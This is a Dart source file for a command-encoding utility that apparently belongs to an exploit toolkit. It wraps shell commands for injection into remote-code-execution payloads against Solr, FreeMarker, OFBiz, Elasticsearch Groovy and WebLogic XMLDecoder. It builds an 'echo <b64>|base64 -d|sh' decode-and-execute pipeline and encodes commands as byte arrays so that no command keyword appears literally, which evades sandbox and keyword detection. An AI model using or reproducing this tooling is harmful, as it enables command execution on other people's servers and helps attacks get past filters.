import 'dart:convert';

/// Utility methods for encoding shell commands before embedding them in
/// exploit payloads.  Each method targets a specific injection context;
/// they are NOT interchangeable — pick the one that matches the sink.
class RceEncoder {
  RceEncoder._();

  /// Wraps [cmd] in a base64-decode-and-execute shell pipeline:
  /// `echo <b64>|base64 -d|sh`.
  ///
  /// Use when the command must survive inside JSON or shell argument lists
  /// (e.g. Solr RunExecutableListener `args`).
  static String shellBase64Wrap(String cmd) {
    final b64 = base64Encode(utf8.encode(cmd));
    return 'echo $b64|base64 -d|sh';
  }

  /// Escapes backslashes and double quotes for embedding inside a
  /// double-quoted string literal (FreeMarker, PHP `shell_exec("…")`,
  /// Druid JavaScript engine).
  static String escapeDoubleQuoted(String cmd) =>
      cmd.replaceAll(r'\', r'\\').replaceAll('"', r'\"');

  /// Returns the UTF-16 code units of [cmd] as a comma-separated decimal
  /// string: `72,101,108,108,111`.
  ///
  /// Used in Groovy/Java payloads of the form
  /// `new String([<bytes>] as byte[])` so no command keyword appears
  /// literally in the script source (OFBiz sandbox, ES Groovy engine).
  static String groovyByteArray(String cmd) => cmd.codeUnits.join(',');

  /// XML-escapes [cmd] for safe embedding inside an XML text node or attribute.
  ///
  /// Use when the command is placed directly inside an XML payload
  /// (e.g. WebLogic XMLDecoder SOAP body).  The XML parser decodes the
  /// entities back to the original characters before passing the value to
  /// the target API, so the command is received intact.
  static String xmlEscape(String cmd) => cmd
      .replaceAll('&', '&amp;')   // must be first
      .replaceAll('<', '&lt;')
      .replaceAll('>', '&gt;')
      .replaceAll('"', '&quot;')
      .replaceAll("'", '&apos;');
}
